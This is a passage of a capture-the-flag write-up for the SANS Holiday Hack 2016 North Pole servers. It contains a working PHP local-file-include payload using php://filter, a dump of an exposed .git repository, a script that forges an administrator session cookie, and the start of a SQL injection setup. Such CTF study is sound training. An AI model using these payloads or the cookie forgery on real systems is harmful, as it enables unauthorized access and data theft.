+</code></pre></div></div>
+
+<p>The logic to catch an exception (if it should happen) is there, let’s make sure it triggers.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016 $ vim ./smali/com/northpolewonderland/santagram/EditProfile.smali</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+<span class="s">101     if-ne p1, v1, :cond_2</span>
+<span class="s">102</span>
+<span class="s">103     :try_start_0</span>
+<span class="s">104     invoke-virtual {p0}, Lcom/northpolewonderland/santagram/EditProfile;-&gt;getApplicationContext()Landroid/content/Context;</span>
+<span class="s">105</span>
+<span class="s">106     move-result-object v1</span>
+<span class="s">107</span>
+<span class="s">108     invoke-virtual {v1}, Landroid/content/Context;-&gt;getContentResolver()Landroid/content/ContentResolver;</span>
+<span class="s">109</span>
+<span class="s">110     move-result-object v1</span>
+<span class="s">111</span>
+<span class="s">112     invoke-virtual {p3}, Landroid/content/Intent;-&gt;getData()Landroid/net/Uri;</span>
+<span class="s">113</span>
+<span class="s">114      move-result-object v2</span>    <span class="c1"># Replacing with move-exception v1</span>
+<span class="s">115</span>
+<span class="s">116     invoke-static {v1, v2}, Landroid/provider/MediaStore$Images$Media;-&gt;getBitmap(Landroid/content/ContentResolver;Landroid/net/Uri;)Landroid/graphics/Bitmap;</span>
+<span class="s">117     :try_end_0</span>
+<span class="s">118     .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0</span>
+<span class="s">119</span>
+<span class="s">120     move-result-object v0</span>
+<span class="s">121</span>
+<span class="s">122     move-object v1, v0</span>
+<span class="s">123</span>
+<span class="s">124     goto :goto_0</span>
+<span class="s">125</span>
+<span class="s">126     :catch_0</span>
+<span class="s">127     move-exception v1</span>
+<span class="s">128</span>
+<span class="s">129     invoke-virtual {v1}, Ljava/io/IOException;-&gt;printStackTrace()V</span>
+<span class="s">130</span>
+<span class="s">131     :cond_2</span>
+<span class="s">132     move-object v1, v0</span>
+<span class="s">133</span>
+<span class="s">134     goto :goto_0</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+</code></pre></div></div>
+
+<p>Changing line number 114 in the <code class="highlighter-rouge">EditProfile.smali</code> file to be <code class="highlighter-rouge">move-exception v1</code> will cause the app to throw an exception after pressing the Edit Profile button.</p>
+
+<p><img src="/assets/images/sans2016/crash_dump1.png" alt="exception1" /></p>
+
+<p>From here,  take that POST request and send it to Repeater within Burp.</p>
+
+<p><img src="/assets/images/sans2016/crash_dump2.png" alt="exception1" /></p>
+
+<p>The POST request generated a crashdump file called <code class="highlighter-rouge">crashdump-aDjJbG.php</code></p>
+
+<p><img src="/assets/images/sans2016/crash_dump3.png" alt="exception1" /></p>
+
+<p>When trying to fuzz the operation parameter, the error message displayed in the response discloses what the valid JSON keys are.  I already saw what the <code class="highlighter-rouge">WriteCrashDump</code> request looks like, let’s see what the <code class="highlighter-rouge">ReadCrashDump</code> responds with…</p>
+
+<p><img src="/assets/images/sans2016/crash_dump4.png" alt="exception1" /></p>
+
+<p>Getting a little further.  Now it wants a <code class="highlighter-rouge">crashdump</code> key set. Might as well specify a crashdump file to read also, since I have the name of the file generated earlier.</p>
+
+<p><img src="/assets/images/sans2016/crash_dump5.png" alt="exception1" /></p>
+
+<p>So the .php extension is not required.  To solve the final part of this challenge requires having a way to pull a PHP file from the server.  A recent SANS blog post titled <a href="https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities">Getting MOAR Value out of PHP Local File Include Vulnerabilities</a> pointed me in the right direction. Specifically, I will be using a PHP wrapper to base64 encode the target file and then I can decode it easily.</p>
+
+<p><img src="/assets/images/sans2016/crash_dump6.png" alt="exception1" /></p>
+
+<p>Final payload <code class="highlighter-rouge">{"operation":"ReadCrashDump","data":{"crashdump":"php://filter/convert.base64-encode/resource=crashdump-aDjJbG"}}</code></p>
+
+<p>Saving the base64 encoded text to a file, then decoding it reveals the location of the audio file.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_base64.txt| base64 -D &gt; exception_decoded.txt</span>
+<span class="s">josh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_decoded.txt</span>
+<span class="s">&lt;?php</span>
+
+<span class="c1"># Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3</span>
+
+<span class="c1"># Code from http://thisinterestsme.com/receiving-json-post-data-via-php/</span>
+<span class="c1"># Make sure that it is a POST request.</span>
+<span class="s">if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){</span>
+    <span class="s">die("Request method must be POST\n");</span>
+<span class="err">}</span>
+
+<span class="c1"># Make sure that the content type of the POST request has been set to application/json</span>
+<span class="s">$contentType = isset($_SERVER["CONTENT_TYPE"]) ? trim($_SERVER["CONTENT_TYPE"])</span> <span class="pi">:</span> <span class="s1">'</span><span class="s">';</span>
+<span class="s">if(strcasecmp($contentType, 'application/json') != 0){</span>
+    <span class="s">die("Content type must be</span><span class="pi">:</span> <span class="s">application/json\n");</span>
+<span class="err">}</span>
+
+<span class="c1"># Grab the raw POST. Necessary for JSON in particular.</span>
+<span class="s">$content = file_get_contents("php://input");</span>
+<span class="s">$obj = json_decode($content, </span><span class="no">true</span><span class="s">);</span>
+<span class="err">	</span><span class="c1"># If json_decode failed, the JSON is invalid.</span>
+<span class="s">if(!is_array($obj)){</span>
+    <span class="s">die("POST contains invalid JSON!\n");</span>
+<span class="err">}</span>
+
+<span class="c1"># Process the JSON.</span>
+<span class="s">if ( ! isset( $obj['operation']) or (</span>
+<span class="err">	</span><span class="s">$obj['operation'] !== "WriteCrashDump" and</span>
+<span class="err">	</span><span class="s">$obj['operation'] !== "ReadCrashDump"))</span>
+<span class="err">	</span><span class="pi">{</span>
+	<span class="nv">die("Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.\n");</span>
+<span class="pi">}</span>
+<span class="s">if ( isset($obj['data'])) {</span>
+<span class="err">	</span><span class="s">if ($obj['operation'] === "WriteCrashDump") {</span>
+<span class="err">		</span><span class="c1"># Write a new crash dump to disk</span>
+<span class="err">		</span><span class="s">processCrashDump($obj['data']);</span>
+<span class="err">	}</span>
+<span class="err">	</span><span class="s">elseif ($obj['operation'] === "ReadCrashDump") {</span>
+<span class="err">		</span><span class="c1"># Read a crash dump back from disk</span>
+<span class="err">		</span><span class="s">readCrashdump($obj['data']);</span>
+<span class="err">	}</span>
+<span class="err">}</span>
+<span class="s">else {</span>
+<span class="err">	</span><span class="c1"># data key unset</span>
+<span class="err">	</span><span class="s">die("Fatal error! JSON key 'data' must be set.\n");</span>
+<span class="err">}</span>
+<span class="s">function processCrashdump($crashdump) {</span>
+<span class="err">	</span><span class="s">$basepath = "/var/www/html/docs/";</span>
+<span class="err">	</span><span class="s">$outputfilename = tempnam($basepath, "crashdump-");</span>
+<span class="err">	</span><span class="s">unlink($outputfilename);</span>
+
+<span class="err">	</span><span class="s">$outputfilename = $outputfilename . ".php";</span>
+<span class="err">	</span><span class="s">$basename = basename($outputfilename);</span>
+
+<span class="err">	</span><span class="s">$crashdump_encoded = "&lt;?php print('" . json_encode($crashdump, JSON_PRETTY_PRINT) . "');";</span>
+<span class="err">	</span><span class="s">file_put_contents($outputfilename, $crashdump_encoded);</span>
+
+<span class="err">	</span><span class="s">print &lt;&lt;&lt;END</span>
+<span class="pi">{</span>
+	<span class="s2">"</span><span class="s">success"</span> <span class="pi">:</span> <span class="nv">true</span><span class="pi">,</span>
+	<span class="s2">"</span><span class="s">folder"</span> <span class="pi">:</span> <span class="s2">"</span><span class="s">docs"</span><span class="pi">,</span>
+	<span class="s2">"</span><span class="s">crashdump"</span> <span class="pi">:</span> <span class="s2">"</span><span class="s">$basename"</span>
+<span class="pi">}</span>
+
+<span class="s">END;</span>
+<span class="err">}</span>
+<span class="s">function readCrashdump($requestedCrashdump) {</span>
+<span class="err">	</span><span class="s">$basepath = "/var/www/html/docs/";</span>
+<span class="err">	</span><span class="s">chdir($basepath);</span>
+
+<span class="err">	</span><span class="s">if ( ! isset($requestedCrashdump['crashdump'])) {</span>
+<span class="err">		</span><span class="s">die("Fatal error! JSON key 'crashdump' must be set.\n");</span>
+<span class="err">	}</span>
+
+<span class="err">	</span><span class="s">if ( substr(strrchr($requestedCrashdump['crashdump'], "."), 1) === "php" ) {</span>
+<span class="err">		</span><span class="s">die("Fatal error! crashdump value duplicate '.php' extension detected.\n");</span>
+<span class="err">	}</span>
+<span class="err">	</span><span class="s">else {</span>
+<span class="err">		</span><span class="s">require($requestedCrashdump['crashdump'] . '.php');</span>
+<span class="err">	}</span>
+<span class="err">}</span>
+
+<span class="s">?&gt;</span>
+</code></pre></div></div>
+
+<p>Audio file location: http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3</p>
+
+<blockquote>
+  <p>The Uncaught Exception Handler Server is complete!</p>
+</blockquote>
+
+<h3 id="the-mobile-analytics-server-via-credentialed-login-access">The Mobile Analytics Server (via credentialed login access)</h3>
+
+<p>Using the credentials found during <a href="/challenges/#part-1-a-most-curious-business-card">Part 1: A Most Curious Business Card</a> in the APK file, <code class="highlighter-rouge">guest</code> and <code class="highlighter-rouge">busyreindeer78</code> provided credentialed access to the login portal at <code class="highlighter-rouge">https://analytics.northpolewonderland.com</code>.</p>
+
+<p><img src="/assets/images/sans2016/analytics_as_guest.png" alt="analytics_site" /></p>
+
+<p>Once authenticated, simply click the <a href="https://analytics.northpolewonderland.com/getaudio.php?id=20c216bc-b8b1-11e6-89e1-42010af00008">MP3 link</a> at the top to grab <code class="highlighter-rouge">discombobulatedaudio2.mp3</code>.</p>
+
+<blockquote>
+  <p>The Mobile Analytics Server (via credentialed login access) is complete!</p>
+</blockquote>
+
+<h3 id="the-mobile-analytics-server-post-authentication">The Mobile Analytics Server (post authentication)</h3>
+
+<p>Already knowing that I had the audio file for the authenticated <code class="highlighter-rouge">guest</code> account, there must be another area to attack on this server.  Another elf named “Minty Candycane” suggested using the nmap default scripts (-sC) flag to find extra files on web servers.  Let’s give it a shot.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016 $ nmap -sC -p- analytics.northpolewonderland.com -oA analytics.northpolewonderland.com</span>
+
+<span class="s">Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 13:32 EST</span>
+<span class="s">Nmap scan report for analytics.northpolewonderland.com (104.198.252.157)</span>
+<span class="s">Host is up (0.040s latency).</span>
+<span class="s">rDNS record for 104.198.252.157</span><span class="pi">:</span> <span class="s">157.252.198.104.bc.googleusercontent.com</span>
+<span class="na">Not shown</span><span class="pi">:</span> <span class="s">65533 filtered ports</span>
+<span class="s">PORT    STATE SERVICE</span>
+<span class="s">22/tcp  open  ssh</span>
+<span class="pi">|</span> <span class="err">ssh-hostkey:</span>
+<span class="err">|</span><span class="no">   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)</span>
+<span class="err">|</span><span class="no">   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)</span>
+<span class="err">|</span><span class="no">_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)</span>
+<span class="err">4</span><span class="no">43/tcp open  https</span>
+<span class="err">|</span><span class="no"> http-git:</span>
+<span class="err">|</span><span class="no">   104.198.252.157:443/.git/</span>
+<span class="err">|</span><span class="no">     Git repository found!</span>
+<span class="err">|</span><span class="no">     Repository description: Unnamed repository; edit this file 'description' to name the...</span>
+<span class="err">|</span><span class="no">_    Last commit message: Finishing touches (style, css, etc)</span>
+<span class="err">|</span><span class="no"> http-title: Sprusage Usage Reporter!</span>
+<span class="err">|</span><span class="no">_Requested resource was login.php</span>
+<span class="err">|</span><span class="no"> ssl-cert: Subject: commonName=analytics.northpolewonderland.com</span>
+<span class="err">|</span><span class="no"> Subject Alternative Name: DNS:analytics.northpolewonderland.com</span>
+<span class="err">|</span><span class="no"> Not valid before: 2016-12-07T17:35:00</span>
+<span class="err">|</span><span class="no">_Not valid after:  2017-03-07T17:35:00</span>
+<span class="err">|</span><span class="no">_ssl-date: ERROR: Script execution failed (use -d to debug)</span>
+<span class="err">|</span><span class="no"> tls-nextprotoneg:</span>
+<span class="err">|</span><span class="no">_  http/1.1</span>
+
+<span class="err">N</span><span class="no">map done: 1 IP address (1 host up) scanned in 125.65 seconds</span>
+</code></pre></div></div>
+
+<p>A Git repository found! To clone the repository locally, I used <a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a>.  Just clone the dvcs-ripper repo, install any missing requirements and point rip-git.pl at the .git directory. Will also need to ignore SSL certification verification (with -s).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ./rip-git.pl -s -v -u 'https://analytics.northpolewonderland.com/.git/'
+[i] Downloading git files from https://analytics.northpolewonderland.com/.git/
+[i] Auto-detecting 404 as 200 with 3 requests
+[i] Getting correct 404 responses
+[i] Using session name: MtvKvTOc
+[d] found COMMIT_EDITMSG
+[d] found config
+[d] found description
+[d] found HEAD
+[d] found index
+[!] Not found for packed-refs: 404 Not Found
+[!] Not found for objects/info/alternates: 404 Not Found
+[!] Not found for info/grafts: 404 Not Found
+[d] found logs/HEAD
+[d] found objects/d6/3a7e0df35ad525fa40eceae67be5b27215ece8
+[d] found objects/10/57b70e7681f44aac2789e26a2b714327d8c203
+[d] found objects/bb/2646691fc9f6bf5f1a0ade746b28f8147ffa48
+[d] found objects/42/0f433fe33d14abac5c3a588c3e753d0d71d50d
+[d] found objects/5f/0c135e1479d865945577c0a70d0cf39e49cdc7
+[d] found objects/d9/636a3d648e617fcb92055dea63ac2469f67c84
+[d] found objects/f0/d28ed3cc39538a6c415789408ef3f24ded959c
+[d] found objects/02/e8d14ffa8910bfd5365ff36eb96bcd7efc4409
+[d] found objects/6a/b9fe6ec3de2e28b79108ff5110643e9ba32478
+[d] found objects/cf/5f27b161f53d62f97ad6ebc648701288a2ea89
+[d] found objects/26/89a45ab9c38d92675660b9113fc173a0ccf129
+[d] found objects/25/9d406f3f2345b50338d54a53efa36dd08f6f20
+[d] found objects/15/62064538562f077d388044e344e3c2d85450d7
+[d] found objects/07/78ac7de1d7ff8ae46ebabdee33a340ab9506f3
+[d] found objects/19/08b71d42bce15345cabb7a63f57b5c79b85d15
+[d] found objects/43/970092ea851cff05e44aba3e0a67eb351304f3
+[d] found objects/58/c900fd53fced0d588e00e23c26cb8465eed498
+[d] found objects/88/5ec6a4e870ce983aecde3a4f0e398b6a76615f
+[d] found objects/45/edadc1850c3894ab8850d1d77dca9a074a3a6a
+[d] found objects/85/a4207c178fa0f9c6b6bb77a6d42eac487159c0
+[d] found objects/62/547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
+[d] found objects/93/5d79726e13ab65c3b5baa4d925de86059057d4
+[d] found objects/e4/6b41e391ee0e9f4afab7880982501ac1471fb4
+[d] found objects/10/6079e728c97ebea387042a2e076fab62952e1e
+[d] found objects/16/ae0cbe2630a87c0470b9a864bf048e813826db
+[d] found refs/heads/master
+[i] Running git fsck to check for missing items
+Checking object directories: 100% (256/256), done.
+Checking objects: 100% (139/139), done.
+[i] Got items with git fsck: 0, Items fetched: 0
+[!] No more items to fetch. That's it!
+</code></pre></div></div>
+
+<p>Time to see what was pulled down…</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ls -la</span>
+<span class="s">total 304</span>
+<span class="s">drwxr-xr-x  33 josh  wheel   1122 Dec 29 13:52 .</span>
+<span class="s">drwxr-xr-x@ 22 josh  wheel    748 Dec 26 09:31 ..</span>
+<span class="s">drwxr-xr-x  14 josh  wheel    476 Dec 29 13:56 .git</span>
+<span class="s">-rw-r--r--   1 josh  wheel    149 Dec 16 20:58 .gitignore</span>
+<span class="s">-rw-r--r--   1 josh  wheel  18027 Dec 16 20:58 LICENSE</span>
+<span class="s">-rw-r--r--   1 josh  wheel    310 Dec 29 13:52 README.md</span>
+<span class="s">drwxr-xr-x   2 josh  wheel     68 Dec 29 13:45 captured</span>
+<span class="s">-rw-r--r--   1 josh  wheel    290 Dec 29 13:52 crypto.php</span>
+<span class="s">drwxr-xr-x  11 josh  wheel    374 Dec 29 13:52 css</span>
+<span class="s">-rw-r--r--   1 josh  wheel   2958 Dec 29 13:52 db.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel   2392 Dec 29 13:52 edit.php</span>
+<span class="s">drwxr-xr-x   7 josh  wheel    238 Dec 29 13:52 fonts</span>
+<span class="s">-rw-r--r--   1 josh  wheel     29 Dec 29 13:52 footer.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel   1191 Dec 29 13:52 getaudio.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel   2000 Dec 29 13:52 header.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel    819 Dec 29 13:52 index.php</span>
+<span class="s">drwxr-xr-x   5 josh  wheel    170 Dec 29 13:52 js</span>
+<span class="s">-rw-r--r--   1 josh  wheel   2913 Dec 29 13:52 login.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel    174 Dec 29 13:52 logout.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel    325 Dec 29 13:52 mp3.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel   7697 Dec 29 13:52 query.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel   2252 Dec 29 13:52 report.php</span>
+<span class="s">-rwxr-xr-x   1 josh  wheel   6401 Dec 16 20:58 rip-bzr.pl</span>
+<span class="s">-rwxr-xr-x   1 josh  wheel   4718 Dec 16 20:58 rip-cvs.pl</span>
+<span class="s">-rwxr-xr-x   1 josh  wheel  15114 Dec 16 20:58 rip-git.pl</span>
+<span class="s">-rwxr-xr-x   1 josh  wheel   6102 Dec 16 20:58 rip-hg.pl</span>
+<span class="s">-rwxr-xr-x   1 josh  wheel   6157 Dec 16 20:58 rip-svn.pl</span>
+<span class="s">-rw-r--r--   1 josh  wheel   5008 Dec 29 13:52 sprusage.sql</span>
+<span class="s">drwxr-xr-x   6 josh  wheel    204 Dec 29 13:52 test</span>
+<span class="s">-rw-r--r--   1 josh  wheel    629 Dec 29 13:52 this_is_html.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel    739 Dec 29 13:52 this_is_json.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel    647 Dec 29 13:52 uuid.php</span>
+<span class="s">-rw-r--r--   1 josh  wheel   1949 Dec 29 13:52 view.php</span>
+</code></pre></div></div>
+
+<p>Taking a look at the <code class="highlighter-rouge">header.php</code> file revealed that there was also an <code class="highlighter-rouge">administrator</code> user and they were the only one allowed to view <code class="highlighter-rouge">edit.php</code>.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat header.php</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+        <span class="s">&lt;div class="navbar-collapse collapse" id="navbar-main"&gt;</span>
+          <span class="s">&lt;ul class="nav navbar-nav"&gt;</span>
+            <span class="s">&lt;li&gt;&lt;a href="/query.php"&gt;Query&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="s">&lt;li&gt;&lt;a href="/view.php"&gt;View&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="s">&lt;?php</span>
+              <span class="s">if (get_username() == 'guest') {</span>
+                <span class="s">?&gt;</span>
+                  <span class="s">&lt;li&gt;&lt;a href="/&lt;?= mp3_web_path($db); ?&gt;"&gt;MP3&lt;/a&gt;&lt;/li&gt;</span>
+                <span class="s">&lt;?php</span>
+              <span class="s">}</span>
+              <span class="s">if (get_username() == 'administrator') {</span>
+                <span class="s">?&gt;</span>
+                  <span class="s">&lt;li&gt;&lt;a href="/edit.php"&gt;Edit&lt;/a&gt;&lt;/li&gt;</span>
+                <span class="s">&lt;?php</span>
+              <span class="s">}</span>
+            <span class="s">?&gt;</span>
+          <span class="s">&lt;/ul&gt;</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+</code></pre></div></div>
+<p>The next question you may be asking yourself is, “How do I get the password for the administrator account?”  At this point, you can’t.  However, without a password, how else can you control another user’s authenticated session?</p>
+
+<p>The answer is at the bottom of <code class="highlighter-rouge">login.php</code>.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat login.php</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+<span class="s">EOF;</span>
+  <span class="s">} else {</span>
+    <span class="s">require_once('db.php');</span>
+
+    <span class="s">check_user($db, $_POST['username'], $_POST['password']);</span>
+
+    <span class="s">print "Successfully logged in!";</span>
+
+    <span class="s">$auth = encrypt(json_encode([</span>
+      <span class="s">'username' =&gt; $_POST['username'],</span>
+      <span class="s">'date' =&gt; date(DateTime::ISO8601),</span>
+    <span class="s">]));</span>
+
+    <span class="s">setcookie('AUTH', bin2hex($auth));</span>
+
+    <span class="s">header('Location</span><span class="pi">:</span> <span class="s">index.php?msg=Successfully%20logged%20in!');</span>
+  <span class="s">}</span>
+<span class="s">?&gt;</span>
+</code></pre></div></div>
+<p>The code above describes how session cookies are generated.  I wondered if it was possible to host this application locally and modify this code to bypass the validation associated with <code class="highlighter-rouge">check_user</code>.   This is exactly what can be done because the .git repository had the .sql file.</p>
+
+<p>Time to switch back over to the Kali VM to host the MySQL database and use Apache to serve the PHP files.  The <code class="highlighter-rouge">README.md</code> included in the .git repo describes what is needed.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">root@gh0st1:/var/www/html# cat README.md</span>
+<span class="c1"># Installation</span>
+<span class="err">*</span> <span class="s">Install Linux/ApachePHP/MySQL (this should work fine under nginx and other systems)</span>
+<span class="err">**</span> <span class="s">Make sure you install `php-mysql` and `php-mcrypt`</span>
+<span class="err">*</span> <span class="s">Create a database using `sprusage.sql`</span>
+<span class="err">**</span> <span class="s">Create a MySQL user with full access to that database, and put its account in the variables on top of `db.php`</span>
+</code></pre></div></div>
+<p>Before importing the <code class="highlighter-rouge">sprusage.sql</code> file, a database has to be created for it first.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">root@gh0st1:/var/www/html# mysql</span>
+<span class="s">Welcome to the MySQL monitor.  Commands end with ; or \g.</span>
+<span class="s">Your MySQL connection id is 39140</span>
+<span class="na">Server version</span><span class="pi">:</span> <span class="s">5.6.30-1 (Debian)</span>
+
+<span class="s">Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.</span>
+
+<span class="s">Oracle is a registered trademark of Oracle Corporation and/or its</span>
+<span class="s">affiliates. Other names may be trademarks of their respective</span>
+<span class="s">owners.</span>
+
+<span class="s">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>
+
+<span class="s">mysql&gt; CREATE DATABASE sprusage;</span>
+<span class="s">Query OK, 1 row affected (0.04 sec)</span>
+
+<span class="s">mysql&gt; EXIT;</span>
+<span class="s">Bye</span>
+</code></pre></div></div>
+<p>Now to import the .sql file…</p>
+
+<p>One little note to add here, line 151 in sprusage.sql was actually missing a closing quote after localhost.</p>
+
+<p>Original:
+<code class="highlighter-rouge">GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost;</code></p>
+
+<p>Modified:
+<code class="highlighter-rouge">GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost';</code></p>
+
+<p>With that update made, sprusage.sql will import successfully.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">root@gh0st1:/var/www/html# mysql -u root sprusage &lt; sprusage.sql</span>
+</code></pre></div></div>
+
+<p>Finally, a user has to be created.  The username and password already in use in the db.php is <code class="highlighter-rouge">sprusage</code> with no password set.  That will have to be updated.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">mysql&gt; USE sprusage;</span>
+<span class="s">Reading table information for completion of table and column names</span>
+<span class="s">You can turn off this feature to get a quicker startup with -A</span>
+
+<span class="s">Database changed</span>
+<span class="s">mysql&gt; CREATE USER 'sprusage'@'localhost' IDENTIFIED BY 'SANS2016';</span>
+<span class="s">Query OK, 0 rows affected (0.00 sec)</span>
+
+<span class="s">mysql&gt; GRANT ALL PRIVILEGES ON *.* TO 'sprusage'@'localhost';</span>
+<span class="s">Query OK, 0 rows affected (0.04 sec)</span>
+
+<span class="s">mysql&gt; FLUSH PRIVILEGES;</span>
+<span class="s">Query OK, 0 rows affected (0.00 sec)</span>
+
+<span class="s">mysql&gt; exit;</span>
+<span class="s">Bye</span>
+</code></pre></div></div>
+
+<p>Now to update <code class="highlighter-rouge">db.php</code> setting the new password.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">&lt;?php</span>
+  <span class="s">$dbHost = 'localhost';</span>
+  <span class="s">$dbUsername = 'sprusage';</span>
+  <span class="s">$dbPassword = 'SANS2016';</span>
+  <span class="s">$dbName = 'sprusage';</span>
+  <span class="s">$db = mysqli_connect($dbHost, $dbUsername, $dbPassword, $dbName);</span>
+
+  <span class="s">if(!$db) {</span>
+    <span class="s">reply(500, "Couldn't connect to the database!");</span>
+    <span class="s">exit(1);</span>
+  <span class="s">}</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+</code></pre></div></div>
+
+<p>All the files from the .git pull have been placed in <code class="highlighter-rouge">/var/www/html/</code> so simply browsing to the Kali VM’s IP address on port 80 should show my local version of the analytics web application.</p>
+
+<p><img src="/assets/images/sans2016/locally_hosted_analytics.png" alt="locally_hosted_analytics" /></p>
+
+<p>Great, it works!</p>
+
+<p>By taking the cookie generating code from <code class="highlighter-rouge">login.php</code>, I created a new PHP file called <code class="highlighter-rouge">admin_cookie.php</code> which looks like this:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">&lt;?php</span>
+  <span class="s"># This should be the first require</span>
+  <span class="s">require_once('this_is_html.php');</span>
+  <span class="s">require_once('crypto.php');</span>
+  <span class="s">require_once('db.php');</span>
+
+<span class="s">$auth = encrypt(json_encode([</span>
+      <span class="s">'username' =&gt; 'administrator',</span>
+      <span class="s">'date' =&gt; date(DateTime::ISO8601),</span>
+    <span class="s">]));</span>
+
+<span class="err">	</span><span class="s">setcookie('AUTH', bin2hex($auth));</span>
+<span class="err">	</span><span class="s">echo '[*] Administrator Session Cookie Generated</span><span class="pi">:</span>  <span class="s">AUTH=';</span> 
+<span class="err">	</span><span class="s">echo bin2hex($auth);</span>
+
+<span class="s">?&gt;</span>
+</code></pre></div></div>
+<p>Keeping the required files at the top, hardcoding the username to <code class="highlighter-rouge">administrator</code> then echoing out the generated session (AUTH) cookie.  This is what it looks like when you view it in the browser:</p>
+
+<p><img src="/assets/images/sans2016/analytics_admin_cookie.png" alt="admin_cookie" /></p>
+
+<p>With this session cookie, I am essentially the administrator user, just have to inject it. To do that, go back to the real analytics site and use the <a href="https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus">Cookies Manager+</a> Firefox add-on.</p>
+
+<p><img src="/assets/images/sans2016/admin_login1.png" alt="admin_cookie" /></p>
+
+<p>Logging in with the guest account first.</p>
+
+<p><img src="/assets/images/sans2016/admin_login2.png" alt="admin_cookie" />
+Finding the current session cookie.  Open Cookies Manager+ (1), search for the domain and press edit (2).</p>
+
+<p><img src="/assets/images/sans2016/admin_login3.png" alt="admin_cookie" />
+Replacing the guest user session cookie with the generated administrator one. Then refresh the page.</p>
+
+<p><img src="/assets/images/sans2016/admin_login4.png" alt="admin_cookie" />
+Boom goes the dynamite.  The <code class="highlighter-rouge">edit.php</code> page is now accessible.</p>
+
+<p>Now that I have administrator access it’s time to move on to exploit the final vulnerability on this host which is SQL injection.  <a href="http://sqlmap.org/">SQLMap</a>
+won’t help with this one though.  It takes a few steps to get setup so let’s get going.</p>
+
+<p>First, create a query and check the “Save Query” box.  Doesn’t matter if it contains data or not, then press “Run Query.”</p>
+
+<p><img src="/assets/images/sans2016/sqli_setup1.png" alt="sqli_setup1" /></p>
+
+<p>This query is now saved under 14ee7e28-9835-4fe6-a3f4-e4d4127d0d22</p>
+
+<p><img src="/assets/images/sans2016/sqli_setup2.png" alt="sqli_setup2" /></p>
+
+<p>The generated link for this report is <code class="highlighter-rouge">https://analytics.northpolewonderland.com/view.php?id=14ee7e28-9835-4fe6-a3f4-e4d4127d0d22</code></p>
+
+<p><img src="/assets/images/sans2016/sqli_setup3.png" alt="sqli_setup2" /></p>
+
+<p>Before moving to the next step, let’s take a quick look at the <code class="highlighter-rouge">query.php</code> file pulled from the .git repo.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat query.php</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+      <span class="s">$value = mysqli_real_escape_string($db, $values[$i]);</span>
+
+      <span class="s">$where[] = "`$field` $modifier '$value'";</span>
+    <span class="s">}</span>
+    <span class="s">$where[] = "`date`='" . mysqli_real_escape_string($db, $date) . "' ";</span>
+
